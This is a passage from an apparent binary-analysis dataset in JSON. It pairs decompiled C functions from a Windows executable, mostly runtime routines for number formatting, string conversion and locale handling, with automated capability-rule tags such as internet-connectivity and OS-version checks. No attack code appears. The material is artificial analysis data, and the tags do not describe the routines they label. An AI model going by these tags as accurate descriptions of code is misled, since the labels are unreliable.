(var_750h != NULL) {\n                    if (var_1d4h < 0x73) {\n                        (&var_1d0h)[var_1d4h] = var_750h;\n                        var_1d4h = var_1d4h + 1;\n                    }\n                    else {\n                        var_970h = 0;\n                        var_1d4h = NULL;\n                        fcn.0040ed22(&var_1d0h, 0x1cc, &var_96ch, 0);\n                    }\n                }\n            }\n            iVar5 = fcn.0040f7f0(&var_1d4h, &var_3a4h);\n            puVar16 = var_75ch;\n            if (iVar5 == 10) {\n                var_74ch = var_75ch + 1;\n                var_76ch = var_76ch + 1;\n                *var_75ch = 0x31;\n                uVar3 = _var_774h & 0xffffffff;\n                _var_774h = uVar3 | ZEXT48(var_3a4h) << 0x20;\n                if (var_3a4h != NULL) {\n                    puVar17 = NULL;\n                    puVar13 = NULL;\n                    do {\n                        puVar12 = apuStack928[puVar13 + -1];\n                        uVar11 = ZEXT48(puVar12) * 10;\n                        apuStack928[puVar13 + -1] = uVar11 + puVar17;\n                        puVar17 = (ZEXT48(puVar12) * 10 >> 0x20) + CARRY4(uVar11, puVar17);\n                        puVar13 = puVar13 + 1;\n                    } while (puVar13 != var_3a4h);\n                    _var_774h = uVar3 | ZEXT48(puVar17) << 0x20;\n                    if (puVar17 != NULL) {\n                        if (var_3a4h < 0x73) {\n                            apuStack928[var_3a4h + -1] = puVar17;\n                            var_3a4h = var_3a4h + 1;\n                        }\n                        else {\n                            var_970h = 0;\n                            var_3a4h = NULL;\n                            fcn.0040ed22(&var_3a0h, 0x1cc, &var_96ch, 0);\n                        }\n                    }\n                }\ncode_r0x0042028b:\n                puVar13 = puVar16 + 1;\n                uVar11 = var_76ch;\n            }\n            else {\n                if (iVar5 != 0) {\n                    var_74ch = var_75ch + 1;\n                    *var_75ch = iVar5 + '0';\n                    goto code_r0x0042028b;\n                }\n                uVar11 = var_76ch - 1;\n            }\n            var_788h[1] = uVar11;\n            uVar15 = var_784h;\n            if (((-1 < uVar11) && (var_784h < 0x80000000)) && (arg_14h == 0)) {\n                uVar15 = var_784h + uVar11;\n            }\n            uVar11 = arg_20h - 1U;\n            if (uVar15 <= arg_20h - 1U) {\n                uVar11 = uVar15;\n            }\n            var_750h = uVar11 + var_75ch;\n            var_755h._0_1_ = 0;\n            if (puVar13 != var_750h) {\n                do {\n                    puVar16 = var_74ch;\n                    uVar3 = _var_774h & 0xffffffff;\n                    _var_774h = uVar3 | ZEXT48(var_1d4h) << 0x20;\n                    if (var_1d4h == NULL) break;\n                    uVar11 = 0;\n                    puVar13 = NULL;\n                    do {\n                        uVar15 = (&var_1d0h)[puVar13];\n                        uVar10 = uVar15 * 1000000000;\n                        (&var_1d0h)[puVar13] = uVar10 + uVar11;\n                        uVar11 = (uVar15 * 1000000000 >> 0x20) + CARRY4(uVar10, uVar11);\n                        puVar13 = puVar13 + 1;\n                    } while (puVar13 != var_1d4h);\n                    _var_774h = uVar3 | uVar11 << 0x20;\n                    if (uVar11 != 0) {\n                        if (var_1d4h < 0x73) {\n                            (&var_1d0h)[var_1d4h] = uVar11;\n                            var_1d4h = var_1d4h + 1;\n                        }\n                        else {\n                            var_970h = 0;\n                            var_1d4h = NULL;\n                            fcn.0040ed22(&var_1d0h, 0x1cc, &var_96ch, 0);\n                        }\n                    }\n                    uVar11 = fcn.0040f7f0(&var_1d4h, &var_3a4h);\n                    var_784h = 8;\n                    uVar15 = var_750h - puVar16;\n                    do {\n                        _var_774h = _var_774h & 0xffffffff | uVar11 / var_780h << 0x20;\n                        cVar14 = uVar11 % var_780h + '0';\n                        if (var_784h < uVar15) {\n                            *(var_784h + puVar16) = cVar14;\n                        }\n                        else if (cVar14 != '0') {\n                            var_755h._0_1_ = 1;\n                        }\n                        var_784h = var_784h - 1;\n                        uVar11 = uVar11 / var_780h;\n                    } while (var_784h != 0xffffffff);\n                    if (9 < uVar15) {\n                        uVar15 = 9;\n                    }\n                    puVar13 = puVar16 + uVar15;\n                    var_74ch = puVar13;\n                } while (puVar13 != var_750h);\n            }\n            *puVar13 = 0;\n            goto code_r0x00420450;\n        }\n        var_788h[1] = 1;\n        if (iVar5 != 1) {\n            if (iVar5 == 2) {\n                arg_10h_00 = \"1#QNAN\";\n            }\n            else if (iVar5 == 3) {\n                arg_10h_00 = \"1#SNAN\";\n            }\n            else {\n                if (iVar5 != 4) goto code_r0x0041f0a4;\n                arg_10h_00 = \"1#IND\";\n            }\n            goto code_r0x0041f063;\n        }\n        iVar5 = fcn.00412d4a(var_75ch, arg_20h, \"1#INF\");\n    }\n    if (iVar5 != 0) {\n        fcn.0040b84c(0, 0, 0, 0, 0);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\ncode_r0x00420450:\n    if (var_794h != '\\0') {\n        fcn.00421e2f(&var_79ch);\n    }\n    fcn.00406dcc(var_970h);\n    return;\n}\n",
        "token_count": 10996
    },
    "004205a3": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __cdecl fcn.004205a3(uint16_t *arg_8h, int32_t *arg_ch, uint32_t arg_10h, uint arg_14h, int32_t arg_18h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t in_ECX;\n    uint32_t uVar3;\n    uint16_t *puVar4;\n    int32_t iVar5;\n    int32_t arg_8h_00;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    arg_8h_00 = *arg_ch;\n    if (arg_8h == NULL) {\n        iVar2 = 0;\n        uVar1 = fcn.00420534(arg_8h_00);\n        while (iVar5 = fcn.00422133(0, arg_8h_00, uVar1, arg_14h, arg_18h),  iVar5 != -1) {\n            if (iVar5 == 0) {\n                return iVar2;\n            }\n            if (iVar5 == 4) {\n                iVar2 = iVar2 + 1;\n            }\n            arg_8h_00 = arg_8h_00 + iVar5;\n            iVar2 = iVar2 + 1;\n            uVar1 = fcn.00420534(arg_8h_00);\n        }\n        *(arg_18h + 0x1c) = 1;\n        *(arg_18h + 0x18) = 0x2a;\n    }\n    else {\n        puVar4 = arg_8h;\n        var_8h = in_ECX;\n        if (arg_10h != 0) {\n            do {\n                uVar1 = fcn.00420534(arg_8h_00);\n                iVar2 = fcn.00422133(&var_8h, arg_8h_00, uVar1, arg_14h, arg_18h);\n                if (iVar2 == -1) {\n                    *arg_ch = arg_8h_00;\n                    *(arg_18h + 0x1c) = 1;\n                    *(arg_18h + 0x18) = 0x2a;\n                    return -1;\n                }\n                if (iVar2 == 0) {\n                    arg_8h_00 = 0;\n                    *puVar4 = 0;\n                    break;\n                }\n                uVar3 = var_8h;\n                if (0xffff < var_8h) {\n                    if (arg_10h < 2) break;\n                    var_8h = var_8h - 0x10000;\n                    arg_10h = arg_10h - 1;\n                    *puVar4 = var_8h >> 10 | 0xd800;\n                    puVar4 = puVar4 + 1;\n                    uVar3 = var_8h & 0x3ff | 0xdc00;\n                }\n                *puVar4 = uVar3;\n                arg_8h_00 = arg_8h_00 + iVar2;\n                puVar4 = puVar4 + 1;\n                arg_10h = arg_10h - 1;\n            } while (arg_10h != 0);\n        }\n        iVar5 = puVar4 - arg_8h >> 1;\n        *arg_ch = arg_8h_00;\n    }\n    return iVar5;\n}\n",
        "token_count": 775
    },
    "00420820": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n\nvoid __cdecl fcn.00420820(uint *arg_8h, uint16_t **arg_ch, uint32_t arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint32_t uVar1;\n    uint16_t *puVar2;\n    int32_t iVar3;\n    uint *arg_8h_00;\n    uint *puVar4;\n    uint16_t *puVar5;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint16_t *var_10h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x48e22c ^ &stack0xfffffffc;\n    puVar5 = *arg_ch;\n    puVar4 = arg_8h;\n    puVar2 = puVar5;\n    if (arg_8h == NULL) {\n        while ((iVar3 = fcn.004222f1(&var_ch, *puVar5, arg_14h, arg_18h),  iVar3 != -1 &&\n               ((iVar3 == 0 || (*(&var_10h + iVar3 + 3) != '\\0'))))) {\n            puVar5 = puVar5 + 1;\n        }\n    }\n    else {\n        while( true ) {\n            var_10h = puVar2;\n            arg_8h_00 = puVar4;\n            if (arg_10h < 4) {\n                arg_8h_00 = &var_ch;\n            }\n            uVar1 = fcn.004222f1(arg_8h_00, *puVar5, arg_14h, arg_18h);\n            if (uVar1 == 0xffffffff) {\n                *arg_ch = var_10h;\n                goto code_r0x0042091d;\n            }\n            if (arg_8h_00 != puVar4) {\n                puVar2 = var_10h;\n                if (arg_10h < uVar1) goto code_r0x004208d1;\n                fcn.00408060(puVar4, arg_8h_00, uVar1);\n            }\n            if ((uVar1 != 0) && (*(puVar4 + (uVar1 - 1)) == '\\0')) break;\n            puVar5 = puVar5 + 1;\n            if (uVar1 != 0) {\n                var_10h = puVar5;\n            }\n            arg_10h = arg_10h - uVar1;\n            puVar4 = puVar4 + uVar1;\n            puVar2 = var_10h;\n        }\n        puVar2 = NULL;\ncode_r0x004208d1:\n        *arg_ch = puVar2;\n    }\ncode_r0x0042091d:\n    fcn.00406dcc(arg_8h);\n    return;\n}\n",
        "token_count": 667
    },
    "004209e3": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004209e3(char *arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    uint uStack24;\n    int32_t var_4h;\n    \n    if (arg_14h == 0) {\n        if (arg_8h == NULL) {\n            if (arg_ch == 0) {\n                return 0;\n            }\n        }\n        else {\ncode_r0x00420965:\n            if (arg_ch != 0) {\n                if (arg_14h == 0) {\n                    *arg_8h = '\\0';\n                    return 0;\n                }\n                if (arg_10h != 0) {\n                    var_4h = arg_14h;\n                    pcVar3 = arg_8h;\n                    iVar4 = arg_ch;\n                    if (arg_14h == -1) {\n                        do {\n                            cVar1 = pcVar3[arg_10h - arg_8h];\n                            *pcVar3 = cVar1;\n                            pcVar3 = pcVar3 + 1;\n                            if (cVar1 == '\\0') {\n                                return 0;\n                            }\n                            iVar4 = iVar4 + -1;\n                        } while (iVar4 != 0);\n                    }\n                    else {\n                        do {\n                            cVar1 = pcVar3[arg_10h - arg_8h];\n                            *pcVar3 = cVar1;\n                            pcVar3 = pcVar3 + 1;\n                            if (cVar1 == '\\0') {\n                                return 0;\n                            }\n                            iVar4 = iVar4 + -1;\n                        } while ((iVar4 != 0) && (var_4h = var_4h + -1,  var_4h != 0));\n                        if (var_4h == 0) {\n                            *pcVar3 = '\\0';\n                        }\n                    }\n                    if (iVar4 != 0) {\n                        return 0;\n                    }\n                    if (arg_14h == -1) {\n                        arg_8h[arg_ch + -1] = '\\0';\n                        return 0x50;\n                    }\n                    *arg_8h = '\\0';\n                    puVar2 = fcn.0040e0ee();\n                    uStack24 = 0x22;\n                    goto code_r0x00420952;\n                }\n                *arg_8h = '\\0';\n            }\n        }\n    }\n    else if (arg_8h != NULL) goto code_r0x00420965;\n    puVar2 = fcn.0040e0ee();\n    uStack24 = 0x16;\ncode_r0x00420952:\n    *puVar2 = uStack24;\n    fcn.0040b81f();\n    return uStack24;\n}\n",
        "token_count": 638
    },
    "004223b9": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool fcn.004223b9(void)\n\n{\n    if (*0x48ec80 == -2) {\n        fcn.0042239a();\n    }\n    return *0x48ec80 != -1;\n}\n",
        "token_count": 49
    },
    "004223d8": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.004223d8(void)\n\n{\n    if ((*0x48ec80 != -1) && (*0x48ec80 != -2)) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*0x48ec80);\n    }\n    return;\n}\n",
        "token_count": 60
    },
    "004225ba": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_34h\n\nvoid __cdecl\nfcn.004225ba(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint8_t *arg_14h, int32_t arg_18h, uint8_t *arg_1ch, \n            int32_t arg_20h, int32_t arg_24h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint unaff_EDI;\n    uint *puVar6;\n    uint var_34h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint32_t lpCPInfo;\n    uint var_12h;\n    uint32_t var_4h;\n    \n    var_4h = *0x48e22c ^ &stack0xfffffffc;\n    var_34h = unaff_EDI;\n    if (arg_18h < 1) {\n        if (arg_18h < -1) goto code_r0x00422804;\n    }\n    else {\n        arg_18h = fcn.0040ff0d(arg_14h, arg_18h);\n    }\n    if (arg_20h < 1) {\n        if (arg_20h < -1) goto code_r0x00422804;\n    }\n    else {\n        arg_20h = fcn.0040ff0d(arg_1ch, arg_20h);\n    }\n    if (arg_24h == 0) {\n        arg_24h = *(*arg_8h + 8);\n    }\n    if ((arg_18h == 0) || (arg_20h == 0)) {\n        if ((arg_18h == arg_20h) ||\n           (((1 < arg_20h || (1 < arg_18h)) ||\n            (iVar1 = (*_sym.imp.KERNEL32.dll_GetCPInfo)(arg_24h, &lpCPInfo),  iVar1 == 0)))) goto code_r0x00422804;\n        if (0 < arg_18h) {\n            if (1 < lpCPInfo) {\n                puVar2 = &var_12h;\n                while (((var_12h != 0 && (*(puVar2 + 1) != 0)) && ((*arg_14h < *puVar2 || (*(puVar2 + 1) < *arg_14h)))))\n                {\n                    puVar2 = puVar2 + 2;\n                    var_12h._0_1_ = *puVar2;\n                }\n            }\n            goto code_r0x00422804;\n        }\n        if (0 < arg_20h) {\n            if (1 < lpCPInfo) {\n                puVar2 = &var_12h;\n                while (((var_12h != 0 && (*(puVar2 + 1) != 0)) && ((*arg_1ch < *puVar2 || (*(puVar2 + 1) < *arg_1ch)))))\n                {\n                    puVar2 = puVar2 + 2;\n                    var_12h._0_1_ = *puVar2;\n                }\n            }\n            goto code_r0x00422804;\n        }\n    }\n    puVar2 = &var_34h;\n    puVar6 = &var_34h;\n    iVar1 = fcn.0041a9a5(arg_24h, 9, arg_14h, arg_18h, 0, 0);\n    if (iVar1 == 0) goto code_r0x00422804;\n    uVar3 = iVar1 * 2 + 8;\n    uVar3 = -(iVar1 * 2 < uVar3) & uVar3;\n    if (uVar3 == 0) {\ncode_r0x0042284e:\n        puVar2 = NULL;\n    }\n    else {\n        if (0x400 < uVar3) {\n            puVar2 = fcn.00414556(uVar3);\n            if (puVar2 != NULL) {\n                *puVar2 = 0xdddd;\n                goto code_r0x00422749;\n            }\n            goto code_r0x0042284e;\n        }\n        fcn.00407370();\n        if (*0x10 == 0x38) goto code_r0x0042284e;\n        var_34h = 0xcccc;\ncode_r0x00422749:\n        puVar2 = puVar2 + 2;\n        if (puVar2 == NULL) goto code_r0x0042284e;\n        iVar4 = fcn.0041a9a5(arg_24h, 1, arg_14h, arg_18h, puVar2, iVar1);\n        if ((iVar4 != 0) && (iVar4 = fcn.0041a9a5(arg_24h, 9, arg_1ch, arg_20h, 0, 0),  iVar4 != 0)) {\n            uVar3 = iVar4 * 2 + 8;\n            uVar3 = -(iVar4 * 2 < uVar3) & uVar3;\n            if (uVar3 == 0) {\ncode_r0x00422842:\n                puVar6 = NULL;\n            }\n            else {\n                if (0x400 < uVar3) {\n                    puVar6 = fcn.00414556(uVar3);\n                    if (puVar6 != NULL) {\n                        *puVar6 = 0xdddd;\n                        goto code_r0x004227d4;\n                    }\n                    goto code_r0x00422842;\n                }\n                fcn.00407370();\n                if (*0x10 == 0x38) goto code_r0x00422842;\n                var_34h = 0xcccc;\ncode_r0x004227d4:\n                puVar6 = puVar6 + 2;\n                if (puVar6 == NULL) goto code_r0x00422842;\n                iVar5 = fcn.0041a9a5(arg_24h, 1, arg_1ch, arg_20h, puVar6, iVar4);\n                if (iVar5 != 0) {\n                    fcn.00415b1d(arg_ch, arg_10h, puVar2, iVar1, puVar6, iVar4, 0, 0, 0);\n                    fcn.00406c2b(puVar6);\n                    fcn.00406c2b(puVar2);\n                    goto code_r0x00422804;\n                }\n            }\n            fcn.00406c2b(puVar6);\n            fcn.00406c2b(puVar2);\n            goto code_r0x00422804;\n        }\n    }\n    fcn.00406c2b(puVar2);\ncode_r0x00422804:\n    fcn.00406dcc(arg_ch);\n    return;\n}\n",
        "token_count": 1573
    },
    "004228be": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nfloat10 fcn.004228be(double param_1)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint arg_14h;\n    double dVar6;\n    double dVar7;\n    uchar in_XMM0 [16];\n    double dVar8;\n    double dVar9;\n    double dVar10;\n    double dVar11;\n    double dStack12;\n    \n    iVar4 = 0;\n    while( true ) {\n        uVar2 = SUB162(in_XMM0 >> 0x30, 0) >> 4;\n        dVar6 = SUB168(in_XMM0, 0) & *0x42ec30 | *0x42eca0;\n        dVar7 = SUB168(in_XMM0, 0) & *0x42ec38 | *0x42eca8;\n        uVar1 = SUB82(*0x42ec50 + dVar6, 0) & 0x7f0;\n        dVar11 = *0x42ec68 & dVar7;\n        dVar9 = (*0x42ec60 & dVar6) * *(uVar1 + 0x42f140) - *0x42ec40;\n        dVar6 = (dVar6 - (*0x42ec60 & dVar6)) * *(uVar1 + 0x42f140);\n        dVar8 = (dVar7 - dVar11) * *(uVar1 + 0x42f148);\n        dVar7 = dVar6 + dVar9;\n        dVar11 = dVar8 + (dVar11 * *(uVar1 + 0x42f148) - *0x42ec48);\n        uVar3 = uVar2 - 1;\n        if (uVar3 < 0x7fe) {\n            iVar4 = (uVar2 - 0x3ff) + iVar4;\n            dVar10 = iVar4;\n            iVar5 = 0;\n            if (uVar1 + iVar4 * 0x400 == 0) {\n                iVar5 = 0x10;\n            }\n            return ((*0x42ecf8 * dVar11 + *0x42ed08) * dVar11 + *0x42ed18) * dVar11 * dVar11 +\n                   ((*0x42ecf0 * dVar7 + *0x42ed00) * dVar7 + *0x42ed10) * dVar7 * dVar7 * dVar7 * dVar7 * dVar7 +\n                   *0x42ed20 * dVar7 + *(uVar1 + 0x42ed38) + dVar10 * *0x42ec78 + (dVar8 & *(iVar5 + 0x42ec88)) +\n                   *(uVar1 + 0x42ed30) + dVar9 + dVar10 * *0x42ec70 + (dVar6 & *(iVar5 + 0x42ec80));\n        }\n        dStack12 = -(*0x42ecb0 == param_1);\n        if (SUB82(dStack12, 0) != 0) break;\n        if (uVar3 != 0xffffffff) {\n            if (uVar3 < 0x7ff) {\n                if (*0x42eca0 == (param_1 & *0x42ec30 | *0x42eca0)) {\n                    return *0x42ecd8;\n                }\n                arg_14h = 0x3e9;\n                dStack12 = *0x42ec30;\n            }\n            else if (((uVar2 & 0x7ff) < 0x7ff) || ((SUB84(param_1, 0) | param_1 >> 0x20 & 0xfffff) == 0)) {\n                dStack12 = -NAN;\n                arg_14h = 9;\n            }\n            else {\n                arg_14h = 0x3e9;\n            }\n            goto code_r0x00422aca;\n        }\n        in_XMM0 = CONCAT88(dVar11, param_1 * *0x42ecc0);\n        iVar4 = -0x34;\n    }\n    arg_14h = 8;\n    dStack12 = *0x42ecd0;\ncode_r0x00422aca:\n    fcn.00420fc3(&param_1, &param_1, &dStack12, arg_14h);\n    return dStack12;\n}\n",
        "token_count": 1013
    },
    "00401430": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00401430(int32_t param_1)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    code *pcVar3;\n    code *pcVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    code **ppcVar7;\n    code **ppcVar8;\n    uint32_t unaff_EBX;\n    int32_t unaff_EBP;\n    int32_t iVar9;\n    uint32_t arg_8h;\n    int32_t iStack88;\n    uint uStack84;\n    uint32_t uStack4;\n    \n    uStack4 = *0x48e22c ^ &stack0xffffffa8;\n    iStack88 = param_1;\n    uStack84 = 0;\n    arg_8h = 0x40145d;\n    fcn.00404b8c(0);\n    ppcVar7 = *0x48f130;\n    if (*0x48f220 == 0) {\n        arg_8h = *0x48f220;\n        fcn.00404b8c(0);\n        if (*0x48f220 == 0) {\n            *0x48f208 = *0x48f208 + 1;\n            *0x48f220 = *0x48f208;\n        }\n        fcn.00404be4();\n    }\n    uVar5 = *0x48f220;\n    iVar6 = *(param_1 + 4);\n    iVar1 = *0x48f220 * 4;\n    if (*0x48f220 < *(iVar6 + 0xc)) {\n        iVar9 = *(iVar1 + *(iVar6 + 8));\n        if (iVar9 != 0) goto code_r0x0040156f;\n    }\n    else {\n        iVar9 = 0;\n    }\n    if (*(iVar6 + 0x14) == '\\0') {\ncode_r0x004014d5:\n        if (iVar9 != 0) goto code_r0x0040156f;\n    }\n    else {\n        iVar6 = fcn.00404f6d();\n        if (uVar5 < *(iVar6 + 0xc)) {\n            iVar9 = *(iVar1 + *(iVar6 + 8));\n            goto code_r0x004014d5;\n        }\n    }\n    if (ppcVar7 == NULL) {\n        ppcVar7 = fcn.00406d89(0x18, arg_8h);\n        if (ppcVar7 == NULL) {\n            ppcVar7 = NULL;\n        }\n        else {\n            iVar1 = *(unaff_EBP + 4);\n            if (iVar1 == 0) {\n                iVar6 = 0x424248;\n            }\n            else {\n                iVar6 = *(iVar1 + 0x18);\n                if (iVar6 == 0) {\n                    iVar6 = iVar1 + 0x1c;\n                }\n            }\n            fcn.00401890(iVar6);\n            ppcVar7[1] = NULL;\n            *ppcVar7 = vtable.std::ctype_char_.0;\n            ppcVar8 = fcn.00405188(&stack0xffffffa4);\n            pcVar2 = ppcVar8[1];\n            pcVar3 = ppcVar8[2];\n            pcVar4 = ppcVar8[3];\n            unaff_EBX = 1;\n            ppcVar7[2] = *ppcVar8;\n            ppcVar7[3] = pcVar2;\n            ppcVar7[4] = pcVar3;\n            ppcVar7[5] = pcVar4;\n        }\n        if ((unaff_EBX & 1) != 0) {\n            fcn.00401e40();\n        }\n        fcn.00404f41(ppcVar7);\n        (**(*ppcVar7 + 4))();\n        *0x48f130 = ppcVar7;\n    }\ncode_r0x0040156f:\n    fcn.00404be4();\n    fcn.00406dcc(unaff_EBP);\n    return;\n}\n",
        "token_count": 911
    },
    "00401590": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00401590(int32_t param_1)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uchar (*pauVar5) [16];\n    uchar *puVar6;\n    uint *puVar7;\n    uint32_t unaff_EBX;\n    int32_t unaff_EBP;\n    int32_t iVar8;\n    uint32_t arg_8h;\n    int32_t iStack160;\n    uint uStack156;\n    uchar auStack112 [44];\n    uchar auStack68 [64];\n    uint32_t uStack4;\n    \n    uStack4 = *0x48e22c ^ &stack0xffffff60;\n    iStack160 = param_1;\n    uStack156 = 0;\n    arg_8h = 0x4015c9;\n    fcn.00404b8c(0);\n    pauVar5 = *0x48f138;\n    if (*0x48f12c == 0) {\n        arg_8h = *0x48f12c;\n        fcn.00404b8c(0);\n        if (*0x48f12c == 0) {\n            *0x48f12c = *0x48f208 + 1;\n            *0x48f208 = *0x48f12c;\n        }\n        fcn.00404be4();\n    }\n    uVar3 = *0x48f12c;\n    iVar4 = *(param_1 + 4);\n    iVar1 = *0x48f12c * 4;\n    if (*0x48f12c < *(iVar4 + 0xc)) {\n        iVar8 = *(iVar1 + *(iVar4 + 8));\n        if (iVar8 != 0) goto code_r0x00401778;\n    }\n    else {\n        iVar8 = 0;\n    }\n    if (*(iVar4 + 0x14) == '\\0') {\ncode_r0x00401647:\n        if (iVar8 != 0) goto code_r0x00401778;\n    }\n    else {\n        iVar4 = fcn.00404f6d();\n        if (uVar3 < *(iVar4 + 0xc)) {\n            iVar8 = *(iVar1 + *(iVar4 + 8));\n            goto code_r0x00401647;\n        }\n    }\n    if (pauVar5 != NULL) goto code_r0x00401778;\n    pauVar5 = fcn.00406d89(0x18, arg_8h);\n    if (pauVar5 == NULL) {\n        pauVar5 = NULL;\ncode_r0x00401755:\n        if ((unaff_EBX & 1) != 0) {\n            fcn.00401e40();\n        }\n        fcn.00404f41(pauVar5);\n        (**(**pauVar5 + 4))();\n        *0x48f138 = pauVar5;\ncode_r0x00401778:\n        fcn.00404be4();\n        fcn.00406dcc(unaff_EBP);\n        return;\n    }\n    *pauVar5 = ZEXT816(0);\n    *pauVar5[1] = 0;\n    iVar1 = *(unaff_EBP + 4);\n    if (iVar1 == 0) {\n        iVar4 = 0x424248;\n    }\n    else {\n        iVar4 = *(iVar1 + 0x18);\n        if (iVar4 == 0) {\n            iVar4 = iVar1 + 0x1c;\n        }\n    }\n    fcn.00401890(iVar4);\n    *(*pauVar5 + 4) = 0;\n    **pauVar5 = vtable.std::numpunct_char_.0;\n    fcn.0040d666();\n    fcn.004052ff(&stack0xffffff90);\n    *(*pauVar5 + 8) = 0;\n    *pauVar5[1] = 0;\n    *(pauVar5[1] + 4) = 0;\n    fcn.004052ff(&stack0xffffffbc);\n    puVar6 = fcn.0040b97a(1, 1);\n    if (puVar6 == NULL) {\n        fcn.00404d2b();\n    }\n    else {\n        *puVar6 = 0;\n        *(*pauVar5 + 8) = puVar6;\n        puVar7 = fcn.0040b97a(6, 1);\n        if (puVar7 != NULL) {\n            *puVar7 = str.false._0_4_;\n            *(puVar7 + 1) = str.false._4_2_;\n            *pauVar5[1] = puVar7;\n            puVar7 = fcn.0040b97a(5, 1);\n            if (puVar7 == NULL) goto code_r0x004017a9;\n            *puVar7 = str.true._0_4_;\n            *(puVar7 + 1) = str.true[4];\n            unaff_EBX = 1;\n            *(pauVar5[1] + 4) = puVar7;\n            *(*pauVar5 + 0xc) = 0x2c2e;\n            goto code_r0x00401755;\n        }\n    }\n    fcn.00404d2b();\ncode_r0x004017a9:\n    fcn.00404d2b();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 1238
    },
    "00401d30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t ** __thiscall fcn.00401d30(int32_t **param_1, int32_t *param_2)\n\n{\n    int32_t *piVar1;\n    \n    *param_1 = param_2;\n    piVar1 = *(*(*param_2 + 4) + 0x38 + param_2);\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 4))();\n    }\n    if (*(*(*param_2 + 4) + 0xc + param_2) != 0) {\n        *(param_1 + 1) = 0;\n        return param_1;\n    }\n    piVar1 = *(param_2 + *(*param_2 + 4) + 0x3c);\n    if ((piVar1 != NULL) && (piVar1 != param_2)) {\n        fcn.00404300();\n        *(param_1 + 1) = *(*(*param_2 + 4) + 0xc + param_2) == 0;\n        return param_1;\n    }\n    *(param_1 + 1) = 1;\n    return param_1;\n}\n",
        "token_count": 259
    },
    "00401f00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00401f00(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    char cVar3;\n    int32_t iVar4;\n    code **arg_8h;\n    int32_t *piVar5;\n    uint *puVar6;\n    char *pcVar7;\n    uint uVar8;\n    uint32_t uVar9;\n    uint32_t unaff_EBX;\n    uint32_t uVar10;\n    int32_t *in_FS_OFFSET;\n    uint var_8h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t uStack156;\n    uint var_88h;\n    uint var_54h;\n    code **var_40h;\n    int32_t *var_3ch;\n    uint var_38h;\n    uint32_t var_34h;\n    uint32_t var_30h;\n    int32_t *var_2ch;\n    uint32_t var_28h;\n    int32_t *var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h_2;\n    uchar *puStack20;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x423470;\n    var_ch_2 = *in_FS_OFFSET;\n    uStack156 = 